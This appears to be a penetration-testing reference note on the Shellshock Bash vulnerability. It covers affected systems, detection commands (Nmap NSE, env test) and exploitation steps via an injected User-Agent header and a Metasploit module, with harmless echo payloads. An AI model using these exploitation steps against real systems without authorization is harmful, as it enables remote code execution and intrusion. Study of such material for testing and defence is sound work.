**Shellshock**, also known as the **Bash Bug**, is a critical vulnerability in the Unix Bash shell. It allows attackers to execute arbitrary code by crafting specially formatted environment variables. The vulnerability stems from improper handling of function definitions within environment variables, enabling remote code execution on vulnerable systems. This flaw can be exploited on web servers running CGI scripts that invoke Bash, such as those using **Apache**, increasing the risk of compromise.

---

## **Affected Systems**
- Systems running **Bash versions 4.3** and earlier (unpatched).
- Commonly found on:
    - Linux distributions (e.g., **Debian**, **CentOS**, **Ubuntu**).
    - **MacOS** systems.
    - Network appliances, embedded devices, and web servers running CGI scripts that invoke Bash (e.g., Apache servers).

--- 

## Detection
- **Nmap NSE Script**:
```
nmap --script http-shellshock --script-args uri=/cgi-bin/vulnerable_script -p80 <target_ip>
```

- **Bash Command to Test for Vulnerability**:

```bash
env x='() { :;}; echo Vulnerable' bash -c "echo Test"
```

## **Exploitation**

#### Using a proxy
1. **Identify a vulnerable CGI script**:

- Detect a CGI script on the server that is executed via Bash. Typically, these scripts are found under `/cgi-bin/`.

2. **Intercept a request**:

- Send a request to the server, and when it hits the proxy, intercept the request.
- In the HTTP request, look for an environment variable (such as `User-Agent`, `Referer`, or `Cookie`) that could be manipulated.

3. **Modify the request to trigger Shellshock**:

- Modify the value of the chosen environment variable to include the malicious Bash function. For example, add the following payload:
```bash
() { :;}; echo; echo; /bin/bash -c "echo 'Test'" 
```

This payload triggers the vulnerability in the server's Bash environment.

Example of a modified `User-Agent` header:

```bash
User-Agent: () { :;}; echo; echo; /bin/bash -c "echo 'Test'" 
```


#### Using Metasploit
1. **Use the Shellshock exploit module**: Load the Apache Shellshock module to exploit the vulnerability in CGI scripts running on an Apache server.

```bash
use exploit/multi/http/apache_mod_cgi_bash_env
```

2. **Set the target host and port**: Specify the target's IP address and the port number (default is port 80 for HTTP).

```bash
set RHOSTS <target_ip>
set RPORT 80
```

3. **Execute the exploit**: Launch the exploit and attempt to gain control over the vulnerable system.

```bash
exploit
```